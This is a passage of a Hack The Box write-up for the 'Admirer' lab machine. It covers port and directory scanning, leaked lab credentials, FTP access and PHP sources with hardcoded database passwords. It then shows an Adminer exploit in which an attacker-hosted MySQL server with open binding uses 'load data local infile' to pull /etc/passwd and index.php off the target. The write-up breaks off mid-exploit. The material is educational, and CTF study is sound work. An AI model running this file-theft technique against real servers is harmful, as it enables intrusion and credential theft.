<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Admirer" /><meta property="og:locale" content="en_US" /><meta name="description" content="Reconnaissance &amp; Enumeration" /><meta property="og:description" content="Reconnaissance &amp; Enumeration" /><link rel="canonical" href="http://susanou.github.io/Writeups/posts/Admirer/" /><meta property="og:url" content="http://susanou.github.io/Writeups/posts/Admirer/" /><meta property="og:site_name" content="Writeups" /><meta property="og:image" content="http://susanou.github.io/Writeups/assets/img/HackTheBox/Admirer/Admirer.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-01T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://susanou.github.io/Writeups/assets/img/HackTheBox/Admirer/Admirer.png" /><meta property="twitter:title" content="Admirer" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-07-06T17:34:52+02:00","datePublished":"2020-08-01T00:00:00+02:00","description":"Reconnaissance &amp; Enumeration","headline":"Admirer","image":"http://susanou.github.io/Writeups/assets/img/HackTheBox/Admirer/Admirer.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://susanou.github.io/Writeups/posts/Admirer/"},"url":"http://susanou.github.io/Writeups/posts/Admirer/"}</script><title>Admirer | Writeups</title><link rel="apple-touch-icon" sizes="180x180" href="/Writeups/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/Writeups/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/Writeups/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/Writeups/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/Writeups/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Writeups"><meta name="application-name" content="Writeups"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/Writeups/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/Writeups/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/Writeups/assets/js/dist/post.min.js"></script> <script defer src="/Writeups/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/Writeups/" alt="avatar" class="mx-auto"> <img src="/Writeups/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/Writeups/">Writeups</a></div><div class="site-subtitle font-italic">Student by day Hacker by night</div></div><ul class="w-100"><li class="nav-item"> <a href="/Writeups/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/Writeups/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/Writeups/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/Writeups/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/Writeups/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Susanou" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/337512" aria-label="htb" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cam.hochberg','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/Writeups/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/cam-hochberg/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/Writeups/"> Posts </a> </span> <span>Admirer</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Admirer</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Cameron Hochberg </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 1, 2020, 12:00 AM +0200" prep="on" > Aug 1, 2020 <i class="unloaded">2020-08-01T00:00:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 6, 2021, 11:34 AM -0400" prefix="Updated " > Jul 6, 2021 <i class="unloaded">2021-07-06T17:34:52+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2778 words">15 min</span></div></div><div class="post-content"><h1 id="reconnaissance--enumeration">Reconnaissance &amp; Enumeration</h1><p>Let’s first start by looking at what ports are open on the machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.10.187
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-03 19:28 CEST
Nmap scan report <span class="k">for </span>10.10.10.187
Host is up <span class="o">(</span>0.023s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Admirer
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>37.88 seconds
</pre></table></code></div></div><p>From this, we see there are 3 ports open: <code class="language-plaintext highlighter-rouge">21</code>, <code class="language-plaintext highlighter-rouge">22</code> and <code class="language-plaintext highlighter-rouge">80</code>. On port <code class="language-plaintext highlighter-rouge">80</code> there is an interesting piece of information.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Admirer/websiteAdmirer.png" alt="WebPage" /></p><h2 id="web">Web</h2><p>We now know that there is a <code class="language-plaintext highlighter-rouge">robot.txt</code> and a folder called <code class="language-plaintext highlighter-rouge">/admin-dir</code>. Let’s look at the content of <code class="language-plaintext highlighter-rouge">robot.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
</pre></table></code></div></div><p>This confirmed my initial suspicion that there is some interesting stuff in the folder <code class="language-plaintext highlighter-rouge">/admin-dir</code>. Let’s use <code class="language-plaintext highlighter-rouge">gobuster</code> to see if there is anything interesting there:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.187/admin-dir <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.10.10.187/admin-dir
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     txt
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/08/03 19:36:14 Starting gobuster
<span class="o">===============================================================</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
/contacts.txt <span class="o">(</span>Status: 200<span class="o">)</span>
/credentials.txt <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">===============================================================</span>
2020/08/03 19:38:04 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>From this we get 2 interesting files: <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentials.txt</code></p><p><strong>contact.txt</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
</pre></table></code></div></div><p><strong>credentials.txt</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
</pre></table></code></div></div><h2 id="ftp">FTP</h2><p>Let’s try to connect to ftp with the login and password that we are given in <code class="language-plaintext highlighter-rouge">credentials.txt</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>ftp 10.10.10.187
Connected to 10.10.10.187.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.187:fukurou<span class="o">)</span>: ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 0        0            3405 Dec 02  2019 dump.sql
<span class="nt">-rw-r--r--</span>    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
</pre></table></code></div></div><p>Let’s download and inspect both files we found.</p><h2 id="files-content">Files Content</h2><p>The content of the dump wasn’t really usefulbut the backup of the website was more interesting. The interesting stuff seems to be the <code class="language-plaintext highlighter-rouge">index.php</code> file and the <code class="language-plaintext highlighter-rouge">utility-scripts</code> folder.</p><p><strong>index.php</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
</pre><td class="rouge-code"><pre>&lt;!DOCTYPE HTML&gt;
&lt;!--
        Multiverse by HTML5 UP
        html5up.net | @ajlkn
        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
--&gt;
&lt;html&gt;
        &lt;head&gt;
                &lt;title&gt;Admirer&lt;/title&gt;
                &lt;meta charset="utf-8" /&gt;
                &lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;
                &lt;link rel="stylesheet" href="assets/css/main.css" /&gt;
                &lt;noscript&gt;&lt;link rel="stylesheet" href="assets/css/noscript.css" /&gt;&lt;/noscript&gt;
        &lt;/head&gt;
        &lt;body class="is-preload"&gt;

                &lt;!-- Wrapper --&gt;
                        &lt;div id="wrapper"&gt;

                                &lt;!-- Header --&gt;
                                        &lt;header id="header"&gt;
                                                &lt;h1&gt;&lt;a href="index.html"&gt;&lt;strong&gt;Admirer&lt;/strong&gt; of skills and visuals&lt;/a&gt;&lt;/h1&gt;
                                                &lt;nav&gt;
                                                        &lt;ul&gt;
                                                                &lt;li&gt;&lt;a href="#footer" class="icon solid fa-info-circle"&gt;About&lt;/a&gt;&lt;/li&gt;
                                                        &lt;/ul&gt;
                                                &lt;/nav&gt;
                                        &lt;/header&gt;

                                &lt;!-- Main --&gt;
                                        &lt;div id="main"&gt;
                                         &lt;?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G&gt;UPrTo}~A"d6b";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn-&gt;connect_error) {
                            die("Connection failed: " . $conn-&gt;connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn-&gt;query($sql);

                        if ($result-&gt;num_rows &gt; 0) {
                            // output data of each row
                            while($row = $result-&gt;fetch_assoc()) {
                                echo "&lt;article class='thumb'&gt;";
                                                        echo "&lt;a href='".$row["image_path"]."' class='image'&gt;&lt;img src='".$row["thumb_path"]."' alt='' /&gt;&lt;/a&gt;";
                                                        echo "&lt;h2&gt;".$row["title"]."&lt;/h2&gt;";
                                                        echo "&lt;p&gt;".$row["text"]."&lt;/p&gt;";
                                                    echo "&lt;/article&gt;";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn-&gt;close();
                    ?&gt;
                                        &lt;/div&gt;

                                &lt;!-- Footer --&gt;
                                        &lt;footer id="footer" class="panel"&gt;
                                                &lt;div class="inner split"&gt;
                                                        &lt;div&gt;
                                                                &lt;section&gt;
                                                                        &lt;h2&gt;Allow yourself to be amazed&lt;/h2&gt;
                                                                        &lt;p&gt;Skills are not to be envied, but to feel inspired by.&lt;br&gt;
                                                                        Visual arts and music are there to take care of your soul.&lt;br&gt;&lt;br&gt;
                                                                        Let your senses soak up these wonders...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
                                                                        &lt;/p&gt;
                                                                &lt;/section&gt;
                                                                &lt;section&gt;
                                                                        &lt;h2&gt;Follow me on ...&lt;/h2&gt;
                                                                        &lt;ul class="icons"&gt;
                                                                                &lt;li&gt;&lt;a href="#" class="icon brands fa-twitter"&gt;&lt;span class="label"&gt;Twitter&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                                                                                &lt;li&gt;&lt;a href="#" class="icon brands fa-facebook-f"&gt;&lt;span class="label"&gt;Facebook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                                                                                &lt;li&gt;&lt;a href="#" class="icon brands fa-instagram"&gt;&lt;span class="label"&gt;Instagram&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                                                                                &lt;li&gt;&lt;a href="#" class="icon brands fa-github"&gt;&lt;span class="label"&gt;GitHub&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                                                                                &lt;li&gt;&lt;a href="#" class="icon brands fa-dribbble"&gt;&lt;span class="label"&gt;Dribbble&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                                                                                &lt;li&gt;&lt;a href="#" class="icon brands fa-linkedin-in"&gt;&lt;span class="label"&gt;LinkedIn&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
                                                                        &lt;/ul&gt;
                                                                &lt;/section&gt;
                                                        &lt;/div&gt;
                                                        &lt;div&gt;
                                                                &lt;section&gt;
                                                                        &lt;h2&gt;Get in touch&lt;/h2&gt;
                                                                        &lt;form method="post" action="#"&gt;&lt;!-- Still under development... This does not send anything yet, but it looks nice! --&gt;
                                                                                &lt;div class="fields"&gt;
                                                                                        &lt;div class="field half"&gt;
                                                                                                &lt;input type="text" name="name" id="name" placeholder="Name" /&gt;
                                                                                        &lt;/div&gt;
                                                                                        &lt;div class="field half"&gt;
                                                                                                &lt;input type="text" name="email" id="email" placeholder="Email" /&gt;
                                                                                        &lt;/div&gt;
                                                                                        &lt;div class="field"&gt;
                                                                                                &lt;textarea name="message" id="message" rows="4" placeholder="Message"&gt;&lt;/textarea&gt;
                                                                                        &lt;/div&gt;
                                                                                &lt;/div&gt;
                                                                                &lt;ul class="actions"&gt;
                                                                                        &lt;li&gt;&lt;input type="submit" value="Send" class="primary" /&gt;&lt;/li&gt;
                                                                                        &lt;li&gt;&lt;input type="reset" value="Reset" /&gt;&lt;/li&gt;
                                                                                &lt;/ul&gt;
                                                                        &lt;/form&gt;
                                                                &lt;/section&gt;
                                                        &lt;/div&gt;
                                                &lt;/div&gt;
                                        &lt;/footer&gt;

                        &lt;/div&gt;

                &lt;!-- Scripts --&gt;
                        &lt;script src="assets/js/jquery.min.js"&gt;&lt;/script&gt;
                        &lt;script src="assets/js/jquery.poptrox.min.js"&gt;&lt;/script&gt;
                        &lt;script src="assets/js/browser.min.js"&gt;&lt;/script&gt;
                        &lt;script src="assets/js/breakpoints.min.js"&gt;&lt;/script&gt;
                        &lt;script src="assets/js/util.js"&gt;&lt;/script&gt;
                        &lt;script src="assets/js/main.js"&gt;&lt;/script&gt;

        &lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><p><strong>admin_tasks.php</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre>&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Administrative Tasks&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt;
  &lt;?php
  // Web Interface to the admin_tasks script
  //
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /***********************************************************************************
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "&lt;br /&gt;", shell_exec("/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1"));
    }
    else
    {
      echo("Invalid task.");
    }
  }
  ?&gt;

  &lt;p&gt;
  &lt;h4&gt;Select task:&lt;/p&gt;
  &lt;form method="POST"&gt;
    &lt;select name="task"&gt;
      &lt;option value=1&gt;View system uptime&lt;/option&gt;
      &lt;option value=2&gt;View logged in users&lt;/option&gt;
      &lt;option value=3&gt;View crontab&lt;/option&gt;
      &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt;
      &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt;
      &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt;
      &lt;option value=7 disabled&gt;Backup database&lt;/option&gt;
    &lt;/select&gt;
    &lt;input type="submit"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><p><strong>db_admin.php</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>&lt;?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn-&gt;connect_error) {
      die("Connection failed: " . $conn-&gt;connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?&gt;
</pre></table></code></div></div><h2 id="the-database">The Database</h2><p>Here is where I first hit a dead end. I tried to connect to the <code class="language-plaintext highlighter-rouge">db_admin.php</code> but it didn’t exist. Then I started looking at <code class="language-plaintext highlighter-rouge">index.php</code> and saw that the database name was <code class="language-plaintext highlighter-rouge">admirerdb</code>. Out of desperation I google <code class="language-plaintext highlighter-rouge">admirer db</code> and got a hit on <code class="language-plaintext highlighter-rouge">adminer</code>. At the end of the <code class="language-plaintext highlighter-rouge">db_admin.php</code> file you can read this line:</p><p><code class="language-plaintext highlighter-rouge">// TODO: Finish implementing this or find a better open source alternative</code></p><p>So my guess was that he is using <code class="language-plaintext highlighter-rouge">Adminer</code> instead (Also a friend pointed out the puns that they love to make @ HTB) and I tried the following address since it works more or less the same as PhpmyAdmin.</p><p><code class="language-plaintext highlighter-rouge">http://10.10.10.187/utility-scripts/adminer.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Admirer/DB.png" alt="WebPortal" /></p><p>Let’s try the <code class="language-plaintext highlighter-rouge">user</code>, <code class="language-plaintext highlighter-rouge">password</code> and <code class="language-plaintext highlighter-rouge">db_name</code> from <code class="language-plaintext highlighter-rouge">index.php</code> but no luck the password is wrong.</p><p>Time to exploit</p><h1 id="exploitation">Exploitation</h1><p>One of the first things we can see is the double versions on the top. First reflex: “google for a vulnerability”. The first hit was the best with a small video to exploit the exploit: <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></p><p>So let’s setup our databse for this.</p><h2 id="setup">Setup</h2><p>Let’s first create a database (I called it exploit) and only have one table so we can dump everything we need.</p><pre><code class="language-SQL">CREATE DATABASE exploit
USE exploit;
CREATE TABLE dmp(content varchar(500));
</code></pre><p>Now let’s create a user to connect to this database and give him some priviledges</p><pre><code class="language-SQL">CREATE USER 'demo'@'%' IDENTIFIED BY 'demopassword';
GRANT ALL PRIVILEDGES ON * . * TO 'demo'@'%';
FLUSH PRIVILEDGES;
</code></pre><p>Finally let’s make sure we can connect from the website and modify the following line of <code class="language-plaintext highlighter-rouge">/etc/mysql/mariadb.conf.d/50_server.cnf</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bind-address        = 0.0.0.0
</pre></table></code></div></div><p>Restart mysql</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>systemctl restart mysql
</pre></table></code></div></div><p>Now time to host</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>mysql <span class="nt">-h</span> localhost <span class="nt">-u</span> demo <span class="nt">-p</span> exploit
Enter password:
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 67
Server version: 10.3.23-MariaDB-1 Debian buildd-unstable

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[</span>exploit]&gt;
</pre></table></code></div></div><p>Connect to through the portal using your <code class="language-plaintext highlighter-rouge">IP ADDRESS</code> from <code class="language-plaintext highlighter-rouge">tun0</code>, the user <code class="language-plaintext highlighter-rouge">demo</code> and his password and connect to the <code class="language-plaintext highlighter-rouge">exploit</code> database and tada</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/Writeups/assets/img/HackTheBox/Admirer/connectedDB.png" alt="connected" /></p><h2 id="actually-using-the-exploit">Actually using the exploit</h2><p>Now that we are connected we can have some fun. Let’s first try to load data in our table</p><pre><code class="language-SQL">load data local infile "/etc/passwd"
info table dmp
field terminated by "/n"
</code></pre><p>But in this case we get an error saying we can’t open the file (kind of obvious but never hurts to try)</p><p>If you remember the <code class="language-plaintext highlighter-rouge">index.php</code>, the password for the database was clear on that file. Let’s load this file in our table:</p><pre><code class="language-SQL">load data local infile "../index.php"
info table dmp
field terminated by "/n"
